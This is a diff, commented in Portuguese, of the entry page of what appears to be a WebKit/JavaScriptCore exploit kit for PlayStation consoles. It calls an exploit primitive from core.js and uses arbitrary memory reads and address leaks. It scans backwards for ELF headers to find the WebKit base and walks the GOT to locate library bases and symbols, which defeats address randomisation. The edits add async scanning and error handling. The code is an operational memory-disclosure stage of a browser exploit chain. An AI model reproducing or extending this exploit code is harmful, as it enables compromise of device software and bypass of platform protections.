@@ -209,15 +209,12 @@
 
 <!-- ============================================================
      ES MODULE ENTRY POINT
-     mem.js já importa core.js?v=10 e int64.js internamente.
-     Usamos a mesma query string para garantir o mesmo módulo.
      ============================================================ -->
 <script type="module">
 
 // --- imports dos módulos do slopkit ------------------------------------------
-import { int64 }        from './resources/int64.js';
+import { int64 } from './resources/int64.js';
 import { establishPrimitive } from './resources/core.js?v=10';
-
 import { installWindowP } from './resources/mem.js';
 
 // int64 precisa estar global pois mem.js e main.js a referenciam via globalThis
@@ -303,7 +300,7 @@ async function tryProcMaps() {
     return null;
 }
 
-// --- pegar ponteiro confiável dentro do WebKit (Seguro via JSC) ---
+// --- pegar ponteiro confiável dentro do WebKit (Seguro via JSC) --------------
 function getWebKitPointer(p) {
     // 1. Tenta pegar o ponteiro salvo silenciosamente pelo core.js
     const ctor = globalThis.__ps5NativeCtor;
@@ -319,7 +316,6 @@ function getWebKitPointer(p) {
     // 2. Fallback JSC: Usar a estrutura do parseInt em vez de DOM
     log('[*] DOM evitado. Usando fallback seguro via parseInt...', 'log-dim');
     try {
-        // Vaza o endereço do objeto JSFunction
         const jsFunc = p.leakval(parseInt);
         
         // Offset 0x18 em uma JSFunction aponta para o Executable
@@ -340,10 +336,8 @@ function getWebKitPointer(p) {
     return null;
 }
 
-
-// --- ELF scan: anda para trás até achar \x7fELF -----------------------------
-function findElfBase(p, ptrInside, label) {
-    // PS4 usa páginas de 16 KB (amd64 large page variant)
+// --- ELF scan: anda para trás até achar \x7fELF (Versão Assíncrona para Debug) ---
+async function findElfBase(p, ptrInside, label) {
     const PAGE     = 0x4000;
     const MAX_BACK = 0x8000;   // até 512 MB
 
@@ -353,7 +347,15 @@ function findElfBase(p, ptrInside, label) {
     for (let i = 0; i < MAX_BACK; i++) {
         if (base.hi === 0 && base.low < PAGE) break;
 
+        // A cada 16 páginas (64KB), pausa para o navegador atualizar o HTML na tela
+        if (i % 16 === 0) {
+            setStatus(`Scaneando ${label}: -${i} páginas (0x${base.toString()})...`, 'running');
+            await new Promise(r => setTimeout(r, 10)); // Yield para a UI
+        }
+
         let magic;
+        // Se bater em uma unmapped page aqui, o console morre,
+        // mas a tela terá congelado mostrando a última página testada!
         try { magic = p.read4(base); }
         catch (_) { base = base.sub32(PAGE); continue; }
 
@@ -464,8 +466,8 @@ function findSymbol(p, elfBase, dyn, name) {
     return null;
 }
 
-// --- descobre libs importadas pela GOT ---------------------------------------
-function discoverImports(p, dyn, ownerLabel) {
+// --- descobre libs importadas pela GOT (agora assíncrono) --------------------
+async function discoverImports(p, dyn, ownerLabel) {
     if (!dyn || !dyn.pltgot) return [];
 
     const numSlots = dyn.pltrelsz ? Math.floor(dyn.pltrelsz / 0x18) + 3 : 256;
@@ -480,7 +482,7 @@ function discoverImports(p, dyn, ownerLabel) {
         if (slot.hi === 0 || slot.hi > 0xFFFF) continue;
         if ((slot.low & 3) !== 0) continue;
 
-        const libBase = findElfBase(p, slot, `got[${i}]@${ownerLabel}`);
+        const libBase = await findElfBase(p, slot, `got[${i}]@${ownerLabel}`);
         if (!libBase) continue;
 
         const key = libBase.toString();
@@ -505,10 +507,16 @@ async function leakAllBases(p) {
     log('', '');
     log('-- FASE 2: Ponteiro inicial no WebKit ---------', 'log-section');
     const wkPtr = getWebKitPointer(p);
+    
+    if (!wkPtr) {
+        setStatus('Falha: Nenhum ponteiro nativo recuperado.', 'error');
+        return null;
+    }
 
     log('', '');
     log('-- FASE 3: ELF scan — WebKit ------------------', 'log-section');
-    const webkitBase = findElfBase(p, wkPtr, 'WebKit');
+    // Agora esperamos o resultado devido à varredura assíncrona
+    const webkitBase = await findElfBase(p, wkPtr, 'WebKit');
     if (!webkitBase) {
         setStatus('Falha: WebKit base não encontrada', 'error');
         return null;
@@ -531,7 +539,8 @@ async function leakAllBases(p) {
 
     log('', '');
     log('-- FASE 5: Descobrindo libs importadas --------', 'log-section');
-    const imports = discoverImports(p, wkDyn, 'WebKit');
+    // Agora aguardamos também a descoberta de imports
+    const imports = await discoverImports(p, wkDyn, 'WebKit');
 
     log('', '');
     log(`  Total: ${imports.length} módulos encontrados`, 'log-info');
@@ -621,12 +630,10 @@ async function leakAllBases(p) {
 
 // --- EVENTO do core.js -------------------------------------------------------
 function onCoreEvent(tag, detail, attempt) {
-    // atualiza contadores de tentativa / estágio na UI
     if (attempt !== undefined)
         $attemptTxt.textContent = `tentativa: ${attempt}`;
     $stageTxt.textContent = `estágio: ${tag.toLowerCase()}`;
 
-    // filtra eventos muito verbosos para o console visual
     const VERBOSE = ['PAIR-REPROVED','PAIR-IDENTITY-MAIN','PAIR-IDENTITY-WORKER',
                      'PAIR-COMMIT','PAIR-MAIN-RECORD','PAIR-CELLS',
                      'PAIR-WORKER-HEADER','PAIR-WIDENED','PAIR-RELEASE'];
@@ -651,7 +658,7 @@ function onCoreEvent(tag, detail, attempt) {
     setStatus('Rodando exploit JSC (core.js)…', 'running');
     log('-- EXPLOIT JSC (WebKit) ------------------------', 'log-section');
 
-let carrier;
+    let carrier;
     try {
         carrier = await establishPrimitive({
             onEvent: onCoreEvent,
